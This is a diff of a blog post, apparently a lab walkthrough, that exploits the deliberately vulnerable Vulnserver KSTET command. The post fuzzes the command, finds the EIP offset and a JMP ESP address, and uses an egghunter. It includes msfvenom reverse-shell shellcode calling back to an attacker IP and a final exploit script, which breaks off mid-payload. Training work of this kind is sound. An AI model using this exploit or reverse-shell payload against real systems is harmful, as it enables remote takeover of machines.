@@ -38,10 +38,10 @@ HTER [hter_value]
 LTER [lter_value]
 KSTAN [lstan_value]
 EXIT
-</pre></table></code></div></div><h2 id="fuzzing-kstet-command-with-process-monitoring">Fuzzing KSTET command with process monitoring</h2><p>In previous blog post we used boofuzz with post_test_case_callback function to remotely detect crash. Callback function would try to connect to remote application and receive information (usually banner) and if no banner was received fuzzer would presume that application crashed. <br /> In this blog post we can try something different, we can try to detect crash with pydbg module. This approach requires python and pzdbg module installed on target machine.</p><p>Boofuzz has embedded process monitoring script which can be used to detect crash. At a time of writing this blog post, Vulnserver application was running on old version of Windows 7 with pyton 2.7. Both operating system and python version reached end of life and it was really “pain in the a**” to install boofuzz due to TLS 1.0 not being supported any more etc. As quick workaround I created a simple (local) process monitoring script which can be used by boofuzz running on remote server.</p><p>In order to create process monitoring script, both python and pdbg needs to be installed on target machine. In order to avoid TSL 1.0 issues as workaround Burp, running on attacking machine, can be used as proxy (in that way Burp would use TLS 1.2 for connection with repository) and “trusted-host” arguments can be used to ignore certificate verification and validation. Not a particularly secure way of installing modules but since we are using “disposable” test virtual machine it shouldn’t be an issue.</p><p>Once get-pip.py is downloaded we can use python with proxy and trusted-host arguments to install pip:</p><p><code class="language-plaintext highlighter-rouge">python get-pip.py --trusted-host pypi.org --trusted-host files.pythonhosted.org --proxy 172.16.24.204:8080</code></p><p>After pip is installed pydbg needs to be downloaded and install with pip as instructed at: https://gist.github.com/vuonghv/01fce167746d9eac7e487c7959d10c47</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></table></code></div></div><h2 id="fuzzing-kstet-command-with-process-monitoring">Fuzzing KSTET command with process monitoring</h2><p>In previous blog posts we used boofuzz with post_test_case_callback function to remotely detect crash. Callback function would try to connect to remote application and receive information (usually banner) and if no banner was received fuzzer would presume that application crashed. <br /> In this blog post we can try something different, we can try to detect crash with pydbg module. This approach requires python and pydbg module installed on target machine.</p><p>Boofuzz has embedded process monitoring script which can be used to detect crash. At a time of writing this blog post Vulnserver application was running on old version of Windows 7 with pyton 2.7. Both operating system and python version reached end of life and it was really “pain in the ***” to install boofuzz due to TLS 1.0 not being supported any other issues. As quick workaround I created a simple (local) process monitoring script which can be used by boofuzz running on remote server.</p><p>In order to create process monitoring script, both python and pydbg needs to be installed on target machine. In order to avoid TSL 1.0 issues as workaround Burp, running on attacking machine, can be used as proxy (in that way Burp would use TLS 1.2 for connection with repository) and “trusted-host” arguments can be used to ignore certificate verification and validation. Not a particularly secure way of installing modules but since we are using “disposable” test virtual machine it shouldn’t be an issue.</p><p>Once get-pip.py is downloaded from <a href="https://pip.pypa.io/en/stable/installing/">https://pip.pypa.io/en/stable/installing/</a> we can use python with proxy and trusted-host arguments to install pip:</p><p><code class="language-plaintext highlighter-rouge">python get-pip.py --trusted-host pypi.org --trusted-host files.pythonhosted.org --proxy 172.16.24.204:8080</code></p><p>After pip is installed pydbg needs to be downloaded and install with pip as instructed at:<a href="https://gist.github.com/vuonghv/01fce167746d9eac7e487c7959d10c47">https://gist.github.com/vuonghv/01fce167746d9eac7e487c7959d10c47</a></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
-</pre><td class="rouge-code"><pre>	1. Download unofficial pydbg binaries from http://www.lfd.uci.edu/~gohlke/pythonlibs/#pydbg
-	2. Install the packages: pip install pydbg-1.2-cp27-none-win32.whl
+</pre><td class="rouge-code"><pre>1. Download unofficial pydbg binaries from http://www.lfd.uci.edu/~gohlke/pythonlibs/#pydbg
+2. Install the packages: pip install pydbg-1.2-cp27-none-win32.whl
 </pre></table></code></div></div><p>Now when we have python and pydbg installed we can create simple process monitoring script. Script will start a thread acting as socket server listening on port 4444. Socket server will receive connections and send current status (0 is application didn’t crash and 1 if application crashed). Crash is detected with detect_overflow call back function which is called when access violation is detected:</p><ul><li>Process monitoring script</li></ul><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
@@ -258,7 +258,7 @@ s.send(buffer)
 print "[+] Payload sent"
 #print s.recv(1024)
 s.close()
-</pre></table></code></div></div><p>EIP is overwritten with four chars “A” (41 i hex represent of char “A”):</p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://raw.githubusercontent.com/smarinovic/smarinovic.github.io/master/assets/img/KSTET2.png" alt="Vulnserver KSTET" /></p><p>Next step is to find EIP location in payload. In order to find it we need to send unique string created by msf-pattern_create of Mona scripts:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></table></code></div></div><p>EIP is overwritten with four chars “A” (41 i hex represent of char “A”):</p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://raw.githubusercontent.com/smarinovic/smarinovic.github.io/master/assets/img/KSTET2.png" alt="Vulnserver KSTET" /></p><p>Next step is to find EIP location in payload. In order to find it we need to send unique string created by msf-pattern_create or Mona scripts:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 </pre><td class="rouge-code"><pre>msf-pattern_create -l 5000
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk
@@ -292,13 +292,13 @@ s.close()
 2
 </pre><td class="rouge-code"><pre>msf-pattern_offset -l 5000 -q 41326341
 [*] Exact match at offset 66
-</pre></table></code></div></div><p>When we update PoC we can see that EIP location is indeed at 66 chars after <code class="language-plaintext highlighter-rouge">KSTET /.:/</code>. One more thing we can notice at stack is that we only have 20 bytes of space to use for our shell code. 20 bytes is not enough for bind or reverse shell or even egghunter so will have to jump back to some bigger space in front of EIP location. Since EIP is located at 66 bytes after prefix, we still don’t have to much space for shell code but we have enough to place egghunter (which is 32 bytes long if it doesn’t require encoding).</p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://raw.githubusercontent.com/smarinovic/smarinovic.github.io/master/assets/img/KSTET4.png" alt="KarajaSoft Sami FTP BoF" /></p><ul><li>Finding JMP ESP address</li></ul><p>In order to pass execution to the stack we need to find address with JMP ESP instruction. Mona can be used for searching:</p><p><code class="language-plaintext highlighter-rouge">!mona findwild -s "JMP ESP"</code></p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://raw.githubusercontent.com/smarinovic/smarinovic.github.io/master/assets/img/KSTET5.png" alt="Vulnserver KSTET" /></p><p>There are several JMP ESP addresses in essfunc.dll - ASLR disabled file which belongs to Vulnserver, for example:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></table></code></div></div><p>When we update PoC we can see that EIP location is indeed at 66 chars after <code class="language-plaintext highlighter-rouge">KSTET /.:/</code>. One more thing we can notice at stack is that we only have 20 bytes of space to use for our shell code. 20 bytes is not enough for bind or reverse shell or even egghunter so will have to jump back to some bigger space in front of EIP location. Since EIP is located at 66 bytes after prefix, we still don’t have to much space for shell code but we have enough to place egghunter (which is 32 bytes long if it doesn’t require encoding).</p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://raw.githubusercontent.com/smarinovic/smarinovic.github.io/master/assets/img/KSTET4.png" alt="KarajaSoft Sami FTP BoF" /></p><ul><li>Finding JMP ESP address</li></ul><p>In order to pass execution to the stack we need to find address with JMP ESP instruction. Mona can be used for searching:</p><p><code class="language-plaintext highlighter-rouge">!mona findwild -s "JMP ESP"</code></p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://raw.githubusercontent.com/smarinovic/smarinovic.github.io/master/assets/img/KSTET5.png" alt="Vulnserver KSTET" /></p><p>There are several JMP ESP addresses in essfunc.dll which is ASLR disabled file belonging to Vulnserver, for example:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 </pre><td class="rouge-code"><pre>Log data, item 10
  Address=625011AF
  Message=  0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\VulenrableSoftware\Vulnserver\essfunc.dll)
-</pre></table></code></div></div><p>In order to jump back to the beginning of the payload we need to subtract ESP by 74 bytes (66 to reach beggining of payload plus 4 bytes for EIP address and 5 bytes for sub esp and jmp esp command) and then jump to it. Nasm script can be used to generate opcodes (msf-nasm_shell.rb):</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></table></code></div></div><p>In order to jump back to the beginning of the payload we need to subtract ESP by 74 bytes (66 to reach beggining of payload plus 4 bytes for EIP address and 5 bytes for sub esp and jmp esp command) and then jump to it. Nasm script can be used to generate opcodes (msf-nasm_shell.rb). One note: subtracting 74 bytes would cause and stack alignment issues. Stack must be divided by 4 without remainder. In case of 74: 74/4=18.5 which causes stack alignment issues and payload fails, so we need to jump 68 or 72 bytes and add couple of NOPs before our egghunter code.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -308,7 +308,7 @@ nasm &gt; sub esp, 68
 00000000  83EC44            sub esp,byte +0x44
 nasm &gt; jmp esp
 00000000  FFE4              jmp esp
-</pre></table></code></div></div><p>74 bytes would cause stack alignment issues. Stack must be divided by 4 without remainder. 74/4=18.5 which causes stack alignment issues and payload fails. So we need to jump 68 or 72 bytes and add couple of NOPs before our egghunter code.</p><p>Another way to jump back is to use: <code class="language-plaintext highlighter-rouge">\xeb\xb8</code>opcodes.</p><p>JMP_BCK = “\x83\xEC\x44\xff\xe4” # sub esp 68; jmp esp</p><ul><li>EGG HUNTER</li></ul><p>Next step is to generate egghunter with msf-egghunter script:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></table></code></div></div><p>Another way to jump back is to use: <code class="language-plaintext highlighter-rouge">\xeb\xb8</code>opcodes.</p><p>JMP_BCK = “\x83\xEC\x44\xff\xe4” # sub esp 68; jmp esp</p><ul><li>EGG HUNTER</li></ul><p>Next step is to generate egghunter with msf-egghunter script:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -318,4 +318,212 @@ buf =  b""
 buf += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c"
 buf += b"\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75"
 buf += b"\xea\xaf\x75\xe7\xff\xe7"
-</pre></table></code></div></div><p>and shell code (reverse shell)</p><ul><li>Shellcode</li></ul><p>msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=172.16.24.204 LPORT=4444 -f python -b “\x00” [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload Found 11 compatible encoders Attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 351 (iteration=0) x86/shikata_ga_nai chosen with final size 351 Payload size: 351 bytes Final size of python file: 1712 bytes buf = b”” buf += b”\xba\xc3\x14\x04\x48\xd9\xcd\xd9\x74\x24\xf4\x5e\x33” buf += b”\xc9\xb1\x52\x31\x56\x12\x83\xc6\x04\x03\x95\x1a\xe6” buf += b”\xbd\xe5\xcb\x64\x3d\x15\x0c\x09\xb7\xf0\x3d\x09\xa3” buf += b”\x71\x6d\xb9\xa7\xd7\x82\x32\xe5\xc3\x11\x36\x22\xe4” buf += b”\x92\xfd\x14\xcb\x23\xad\x65\x4a\xa0\xac\xb9\xac\x99” buf += b”\x7e\xcc\xad\xde\x63\x3d\xff\xb7\xe8\x90\xef\xbc\xa5” buf += b”\x28\x84\x8f\x28\x29\x79\x47\x4a\x18\x2c\xd3\x15\xba” buf += b”\xcf\x30\x2e\xf3\xd7\x55\x0b\x4d\x6c\xad\xe7\x4c\xa4” buf += b”\xff\x08\xe2\x89\xcf\xfa\xfa\xce\xe8\xe4\x88\x26\x0b” buf += b”\x98\x8a\xfd\x71\x46\x1e\xe5\xd2\x0d\xb8\xc1\xe3\xc2” buf += b”\x5f\x82\xe8\xaf\x14\xcc\xec\x2e\xf8\x67\x08\xba\xff” buf += b”\xa7\x98\xf8\xdb\x63\xc0\x5b\x45\x32\xac\x0a\x7a\x24” buf += b”\x0f\xf2\xde\x2f\xa2\xe7\x52\x72\xab\xc4\x5e\x8c\x2b” buf += b”\x43\xe8\xff\x19\xcc\x42\x97\x11\x85\x4c\x60\x55\xbc” buf += b”\x29\xfe\xa8\x3f\x4a\xd7\x6e\x6b\x1a\x4f\x46\x14\xf1” buf += b”\x8f\x67\xc1\x56\xdf\xc7\xba\x16\x8f\xa7\x6a\xff\xc5” buf += b”\x27\x54\x1f\xe6\xed\xfd\x8a\x1d\x66\xae\x5b\x05\xba” buf += b”\xc6\x59\x35\x53\x4b\xd7\xd3\x39\x63\xb1\x4c\xd6\x1a” buf += b”\x98\x06\x47\xe2\x36\x63\x47\x68\xb5\x94\x06\x99\xb0” buf += b”\x86\xff\x69\x8f\xf4\x56\x75\x25\x90\x35\xe4\xa2\x60” buf += b”\x33\x15\x7d\x37\x14\xeb\x74\xdd\x88\x52\x2f\xc3\x50” buf += b”\x02\x08\x47\x8f\xf7\x97\x46\x42\x43\xbc\x58\x9a\x4c” buf += b”\xf8\x0c\x72\x1b\x56\xfa\x34\xf5\x18\x54\xef\xaa\xf2” buf += b”\x30\x76\x81\xc4\x46\x77\xcc\xb2\xa6\xc6\xb9\x82\xd9” buf += b”\xe7\x2d\x03\xa2\x15\xce\xec\x79\x9e\xfe\xa6\x23\xb7” buf += b”\x96\x6e\xb6\x85\xfa\x90\x6d\xc9\x02\x13\x87\xb2\xf0” buf += b”\x0b\xe2\xb7\xbd\x8b\x1f\xca\xae\x79\x1f\x79\xce\xab”</p><h2 id="final-exploit">Final exploit</h2><p>The is no space for including shell code in our payload, we need to use some other command to send shellcode and then use egghunter to find it in memory. Several commands like: STATS and GDOG are keeping payload in memory so we could use one of these commands to send tagged (with egg) payload and find it with our egghunter.</p><p>#!/usr/bin/python import socket</p><p>host = “172.16.24.212” port = 9999</p><h1 id="jmp-esp-0x625011af">JMP ESP: 0x625011af</h1><p>JMP_ESP = “\xaf\x11\x50\x62” JMP_BCK = “\x83\xEC\x44\xff\xe4” # sub esp, 68; jmp esp</p><h1 id="we-could-also-use-jmp_bck--xebxb8">we could also use: JMP_BCK = “\xeb\xb8”</h1><h1 id="egg-w00t">EGG: w00t</h1><p>egghunter = b”” egghunter += b”\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c” egghunter += b”\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75” egghunter += b”\xea\xaf\x75\xe7\xff\xe7”</p><p>#msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=172.16.24.204 LPORT=4444 -f python -b “\x00” EXITFUNC=thread #[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload #Found 11 compatible encoders #Attempting to encode payload with 1 iterations of x86/shikata_ga_nai #x86/shikata_ga_nai succeeded with size 351 (iteration=0) #x86/shikata_ga_nai chosen with final size 351 #Payload size: 351 bytes #Final size of python file: 1712 bytes</p><p>buf = b”” buf += b”\xb8\x4a\xf5\x4f\x87\xdb\xd0\xd9\x74\x24\xf4\x5d\x33” buf += b”\xc9\xb1\x52\x83\xc5\x04\x31\x45\x0e\x03\x0f\xfb\xad” buf += b”\x72\x73\xeb\xb0\x7d\x8b\xec\xd4\xf4\x6e\xdd\xd4\x63” buf += b”\xfb\x4e\xe5\xe0\xa9\x62\x8e\xa5\x59\xf0\xe2\x61\x6e” buf += b”\xb1\x49\x54\x41\x42\xe1\xa4\xc0\xc0\xf8\xf8\x22\xf8” buf += b”\x32\x0d\x23\x3d\x2e\xfc\x71\x96\x24\x53\x65\x93\x71” buf += b”\x68\x0e\xef\x94\xe8\xf3\xb8\x97\xd9\xa2\xb3\xc1\xf9” buf += b”\x45\x17\x7a\xb0\x5d\x74\x47\x0a\xd6\x4e\x33\x8d\x3e” buf += b”\x9f\xbc\x22\x7f\x2f\x4f\x3a\xb8\x88\xb0\x49\xb0\xea” buf += b”\x4d\x4a\x07\x90\x89\xdf\x93\x32\x59\x47\x7f\xc2\x8e” buf += b”\x1e\xf4\xc8\x7b\x54\x52\xcd\x7a\xb9\xe9\xe9\xf7\x3c” buf += b”\x3d\x78\x43\x1b\x99\x20\x17\x02\xb8\x8c\xf6\x3b\xda” buf += b”\x6e\xa6\x99\x91\x83\xb3\x93\xf8\xcb\x70\x9e\x02\x0c” buf += b”\x1f\xa9\x71\x3e\x80\x01\x1d\x72\x49\x8c\xda\x75\x60” buf += b”\x68\x74\x88\x8b\x89\x5d\x4f\xdf\xd9\xf5\x66\x60\xb2” buf += 